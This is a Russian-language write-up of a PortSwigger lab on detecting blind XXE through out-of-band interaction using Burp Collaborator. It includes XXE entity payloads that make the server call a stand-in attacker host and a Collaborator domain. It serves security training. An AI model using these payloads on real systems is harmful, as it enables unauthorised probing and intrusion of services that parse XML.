# Blind XXE with out-of-band interaction

## Theory

<h3>Обнаружение слепых XXE с использованием внеполосных (OAST) методов</h3>

Вы часто можете обнаружить слепой XXE, используя ту же технику, что и для атак XXE SSRF, но инициируя внешнее сетевое взаимодействие с системой, которую вы контролируете. Например, вы бы определили внешний объект следующим образом:
```
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://f2g9j7hhkax.web-attacker.com"> ]>
```

Затем вы должны использовать определенный объект в значении данных в XML.

Эта атака XXE заставляет сервер выполнять внутренний HTTP-запрос к указанному URL-адресу. Злоумышленник может отслеживать результирующий поиск DNS и HTTP-запрос и, таким образом, обнаруживать, что атака XXE прошла успешно.

## Writeup

Главная страница:

![](https://github.com/fobblified/Writeups/blob/main/Portswigger/XXE_injection/Blind_XXE_with_out-of-band_interaction/assets/1.png)

Выберем любой продукт.

![](https://github.com/fobblified/Writeups/blob/main/Portswigger/XXE_injection/Blind_XXE_with_out-of-band_interaction/assets/2.png)

Перейдем на его страницу и спустимся в самый низ.

![](https://github.com/fobblified/Writeups/blob/main/Portswigger/XXE_injection/Blind_XXE_with_out-of-band_interaction/assets/3.png)

Нажмем на кнопку "Check stock" и перехватим запрос. Отправляем его в Repeater.

![](https://github.com/fobblified/Writeups/blob/main/Portswigger/XXE_injection/Blind_XXE_with_out-of-band_interaction/assets/4.png)

Запустим Burp Collaborator Client. Скопируем DNS.

![](https://github.com/fobblified/Writeups/blob/main/Portswigger/XXE_injection/Blind_XXE_with_out-of-band_interaction/assets/5.png)

Модифицируем запрос. Вставляем скопированный ранее DNS. Отправляем запрос. Код экплоита:
```
<!DOCTYPE stockCheck [ <!ENTITY xxe SYSTEM "http://twt1qbthnub67jyf9nktnrdg2780wp.burpcollaborator.net"> ]>
```

![](https://github.com/fobblified/Writeups/blob/main/Portswigger/XXE_injection/Blind_XXE_with_out-of-band_interaction/assets/6.png)

Перейдем в Burp Collaborator Client. теперь мы можем заметить результат DNS lookup.

![](https://github.com/fobblified/Writeups/blob/main/Portswigger/XXE_injection/Blind_XXE_with_out-of-band_interaction/assets/7.png)

Получаем ответ от сервера.

![](https://github.com/fobblified/Writeups/blob/main/Portswigger/XXE_injection/Blind_XXE_with_out-of-band_interaction/assets/8.png)
